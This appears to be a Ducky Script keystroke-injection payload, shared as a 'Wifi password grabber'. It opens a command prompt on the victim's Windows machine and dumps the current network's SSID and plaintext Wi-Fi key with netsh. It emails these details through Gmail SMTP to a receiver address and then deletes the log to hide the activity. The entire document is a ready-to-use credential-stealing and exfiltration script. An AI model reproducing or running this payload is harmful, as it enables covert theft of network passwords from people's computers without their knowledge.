# Wifi-Password-Grabber
Wifi password grabber
REM Author: Siem
REM EDITED BY GNOMMISTER (Added more breaks to make code more smoother, still looking forward to make universal code for all types of keyboards(PLEASE ANY SUGGESTIONS))
REM Version: 4
REM Description: Saves the SSID, Network type, Authentication and the password to Log.txt and emails the contents of Log.txt from a gmail account.
DELAY 3000
REM --> Minimize all windows
WINDOWS d
REM --> Open cmd
WINDOWS r
DELAY 500
STRING cmd
ENTER
DELAY 200
REM --> Getting SSID
STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:" %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
ENTER
STRING set A="%A:~1%"
ENTER
REM --> Creating A.txt
STRING netsh wlan show profiles %A% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
ENTER
DELAY 100
REM --> Get network type
STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" A.txt') do set B=%A
ENTER
DELAY 200
REM --> Get authentication
STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" A.txt') do set C=%A
ENTER
DELAY 100
REM --> Get password
STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" A.txt') do set D=%A
ENTER
DELAY 100
REM --> Delete A.txt
STRING del A.txt
ENTER
REM --> Create Log.txt
STRING echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
ENTER
DELAY 200
REM --> Mail Log.txt
STRING powershell
ENTER
DELAY 7000
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
DELAY 300
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
DELAY 3000
STRING $SMTPInfo.EnableSsl = $true
ENTER
DELAY 100
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')
ENTER
DELAY 300
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'ACCOUNT@gmail.com'
ENTER
STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'WiFi key grabber'
ENTER
STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
ENTER
DELAY 1000
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 6000
STRING exit
ENTER
DELAY 2000
REM --> Delete Log.txt and exit
STRING del Log.txt & exit
ENTER
